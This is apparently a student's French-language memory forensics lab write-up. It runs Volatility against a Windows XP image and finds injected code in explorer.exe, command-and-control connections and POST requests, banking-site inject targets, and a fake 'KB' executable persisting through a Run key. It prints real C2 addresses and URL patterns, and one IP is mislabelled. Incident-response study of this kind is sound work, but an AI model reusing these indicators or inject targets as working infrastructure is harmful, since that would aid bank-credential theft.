# Forensic exercice 2 - Volatility
### By Julien Faou


# Invetigation
## imageinfo

```
kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem imageinfo
```

```
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/kali/Documents/forensic/exercice/exo2.vmem)
                      PAE type : PAE
                           DTB : 0x2fe000L
                          KDBG : 0x80545ae0L
          Number of Processors : 1
     Image Type (Service Pack) : 3
                KPCR for CPU 0 : 0xffdff000L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2012-07-22 02:45:08 UTC+0000
     Image local date and time : 2012-07-21 22:45:08 -0400
```

## connexions

### sockets

### connscan
```
kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 connscan
```

```
Volatility Foundation Volatility Framework 2.6
Offset(P)  Local Address             Remote Address            Pid
---------- ------------------------- ------------------------- ---
0x02087620 172.16.112.128:1038       41.168.5.140:8080         1484
0x023a8008 172.16.112.128:1037       125.19.103.198:8080       1484
```

* 2 connexions détectées, on note les adresses IP de destination et les PID.

### Localisation

* Via le site hostip.com
```
45.84.52.160
```
```
Afrique du sud
Gauteng
Johannesburg
```

```
125.19.103.198
```
```
France
Paris
```

## pslist

```
kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 pslist
```

```
Volatility Foundation Volatility Framework 2.6
Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0x823c89c8 System                    4      0     53      240 ------      0                                                              
0x822f1020 smss.exe                368      4      3       19 ------      0 2012-07-22 02:42:31 UTC+0000                                 
0x822a0598 csrss.exe               584    368      9      326      0      0 2012-07-22 02:42:32 UTC+0000                                 
0x82298700 winlogon.exe            608    368     23      519      0      0 2012-07-22 02:42:32 UTC+0000                                 
0x81e2ab28 services.exe            652    608     16      243      0      0 2012-07-22 02:42:32 UTC+0000                                 
0x81e2a3b8 lsass.exe               664    608     24      330      0      0 2012-07-22 02:42:32 UTC+0000                                 
0x82311360 svchost.exe             824    652     20      194      0      0 2012-07-22 02:42:33 UTC+0000                                 
0x81e29ab8 svchost.exe             908    652      9      226      0      0 2012-07-22 02:42:33 UTC+0000                                 
0x823001d0 svchost.exe            1004    652     64     1118      0      0 2012-07-22 02:42:33 UTC+0000                                 
0x821dfda0 svchost.exe            1056    652      5       60      0      0 2012-07-22 02:42:33 UTC+0000                                 
0x82295650 svchost.exe            1220    652     15      197      0      0 2012-07-22 02:42:35 UTC+0000                                 
0x821dea70 explorer.exe           1484   1464     17      415      0      0 2012-07-22 02:42:36 UTC+0000                                 
0x81eb17b8 spoolsv.exe            1512    652     14      113      0      0 2012-07-22 02:42:36 UTC+0000                                 
0x81e7bda0 reader_sl.exe          1640   1484      5       39      0      0 2012-07-22 02:42:36 UTC+0000                                 
0x820e8da0 alg.exe                 788    652      7      104      0      0 2012-07-22 02:43:01 UTC+0000                                 
0x821fcda0 wuauclt.exe            1136   1004      8      173      0      0 2012-07-22 02:43:46 UTC+0000                                 
0x8205bda0 wuauclt.exe            1588   1004      5      132      0      0 2012-07-22 02:44:01 UTC+0000
```

### Correlation

* Observons le process de PID=1484, pour rappel ce dernier établit deux connexions vers l'afrique et la france.

```
0x821dea70 explorer.exe           1484   1464     17      415      0      0 2012-07-22 02:42:36 UTC+0000                                 
```

* __explorer.exe__ est l'explorateur de fichier de windows, il 'nest pas censé utiliser internet, c'est suspect.

## Analyse de malware

### malfind
```
kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 malfind -p 1484
```

```
Volatility Foundation Volatility Framework 2.6
Process: explorer.exe Pid: 1484 Address: 0x1460000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Flags: CommitCharge: 33, MemCommit: 1, PrivateMemory: 1, Protection: 6

0x01460000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............
0x01460010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......
0x01460020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x01460030  00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 00   ................

0x01460000 4d               DEC EBP
0x01460001 5a               POP EDX
0x01460002 90               NOP
0x01460003 0003             ADD [EBX], AL
0x01460005 0000             ADD [EAX], AL
0x01460007 000400           ADD [EAX+EAX], AL
0x0146000a 0000             ADD [EAX], AL
0x0146000c ff               DB 0xff
0x0146000d ff00             INC DWORD [EAX]
0x0146000f 00b800000000     ADD [EAX+0x0], BH
0x01460015 0000             ADD [EAX], AL
0x01460017 004000           ADD [EAX+0x0], AL
0x0146001a 0000             ADD [EAX], AL
0x0146001c 0000             ADD [EAX], AL
0x0146001e 0000             ADD [EAX], AL
0x01460020 0000             ADD [EAX], AL
0x01460022 0000             ADD [EAX], AL
0x01460024 0000             ADD [EAX], AL
0x01460026 0000             ADD [EAX], AL
0x01460028 0000             ADD [EAX], AL
0x0146002a 0000             ADD [EAX], AL
0x0146002c 0000             ADD [EAX], AL
0x0146002e 0000             ADD [EAX], AL
0x01460030 0000             ADD [EAX], AL
0x01460032 0000             ADD [EAX], AL
0x01460034 0000             ADD [EAX], AL
0x01460036 0000             ADD [EAX], AL
0x01460038 0000             ADD [EAX], AL
0x0146003a 0000             ADD [EAX], AL
0x0146003c e000             LOOPNZ 0x146003e
0x0146003e 0000             ADD [EAX], AL
```

* Ce process a bien été modifié par un autre process. malfind le sait grâce aux flags 
```
Flags: CommitCharge: 33, MemCommit: 1, PrivateMemory: 1, Protection: 6
```

### Virus total

* Dumpons le programme douteux

```
kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 procdump --dump-dir .  -p 1484
```

```
Volatility Foundation Volatility Framework 2.6
Process(V) ImageBase  Name                 Result
---------- ---------- -------------------- ------
0x821dea70 0x01000000 explorer.exe         OK: executable.1484.exe
```

* Envoyons le à Virus total

![](./images/virustotal.png)


### Yara rules

FUCK

## commandline

```
kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 cmdline
```

```
Volatility Foundation Volatility Framework 2.6
************************************************************************
System pid:      4
************************************************************************
smss.exe pid:    368
Command line : \SystemRoot\System32\smss.exe
************************************************************************
csrss.exe pid:    584
Command line : C:\WINDOWS\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,3072,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ProfileControl=Off MaxRequestThreads=16
************************************************************************
winlogon.exe pid:    608
Command line : winlogon.exe
************************************************************************
services.exe pid:    652
Command line : C:\WINDOWS\system32\services.exe
************************************************************************
lsass.exe pid:    664
Command line : C:\WINDOWS\system32\lsass.exe
************************************************************************
svchost.exe pid:    824
Command line : C:\WINDOWS\system32\svchost -k DcomLaunch
************************************************************************
svchost.exe pid:    908
Command line : C:\WINDOWS\system32\svchost -k rpcss
************************************************************************
svchost.exe pid:   1004
Command line : C:\WINDOWS\System32\svchost.exe -k netsvcs
************************************************************************
svchost.exe pid:   1056
Command line : C:\WINDOWS\system32\svchost.exe -k NetworkService
************************************************************************
svchost.exe pid:   1220
Command line : C:\WINDOWS\system32\svchost.exe -k LocalService
************************************************************************
explorer.exe pid:   1484
Command line : C:\WINDOWS\Explorer.EXE
************************************************************************
spoolsv.exe pid:   1512
Command line : C:\WINDOWS\system32\spoolsv.exe
************************************************************************
reader_sl.exe pid:   1640
Command line : "C:\Program Files\Adobe\Reader 9.0\Reader\Reader_sl.exe" 
************************************************************************
alg.exe pid:    788
Command line : C:\WINDOWS\System32\alg.exe
************************************************************************
wuauclt.exe pid:   1136
Command line : "C:\WINDOWS\system32\wuauclt.exe" /RunStoreAsComServer Local\[3ec]SUSDSb81eb56fa3105543beb3109274ef8ec1
************************************************************************
wuauclt.exe pid:   1588
Command line : "C:\WINDOWS\system32\wuauclt.exe"
```

## memdump

```
kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 memdump --dump-dir .  -p 1484
```

```
Volatility Foundation Volatility Framework 2.6
************************************************************************
Writing explorer.exe [  1484] to 1484.dmp
```

### grep sur 1484.dmp

```
kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ strings 1484.dmp | grep -Fi "41.168.5.140" -C 10
```

```
DpI8
POST /zb/v_01_a/in/ HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
Host: 41.168.5.140:8080
Content-Length: 229
Connection: Keep-Alive
Cache-Control: no-cache
>mtvR
`06!
```

* On trouve un POST sur l'IP __41.168.5.140__

* Dans le dump d'abode reader on retrouve le même POST !

```
kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ strings 1484.dmp | grep -Fi "/zb/v_01_a/in/" -C 10
```

```
*BusinessAppsHome*
*nab.com.au*
*us.hsbc.com*
*online.citibank.com/*
*BalanceHome*
*PassmarkChallenge*
*ktt.key.com*
*cm.netteller.com*
*/Web_Bank*
*jqueryaddonsv2.js*
http://188.40.0.138:8080/zb/v_01_a/in/cp.php
*account.authorize.net/*
<head*>
<style type="text/css">
body { visibility: hidden; }
.ui-dialog-titlebar { display:none
```

* On découvre une nouvelle adresse IP : __188.40.0.138:8080__


passivedns.mnemonic.no

## Checker les process au demarage

```
printkey -K "software\Microsoft\Windows\Currentversion\Run"
```

```
Registry: \Device\HarddiskVolume1\Documents and Settings\Robert\NTUSER.DAT
Key name: Run (S)
Last updated: 2012-07-22 02:31:51 UTC+0000

Subkeys:

Values:
REG_SZ        KB00207877.exe  : (S) "C:\Documents and Settings\Robert\Application Data\KB00207877.exe"
```


```
strings 1640.dmp | grep -Fi "KB00207877.exe"
```

```
KB00207877.exe
C:\Documents and Settings\Robert\Application Data\KB00207877.exe(,
KB00207877.EXEn
KB00207877.exe
KB00207877.exe
C:\Documents and Settings\Robert\Application Data\KB00207877.exe(,
```

* La conclusion qu'on pourrait en tirer c'est que l'user a téléchargé un patch (la KB qui sont des mises à jours de windows) en pensant régler le problème.
Les KB ne sont pas censés être au démarrage, dès qu'elles ont installés elles ne sont plus actives et partent dans l'historique des KB.





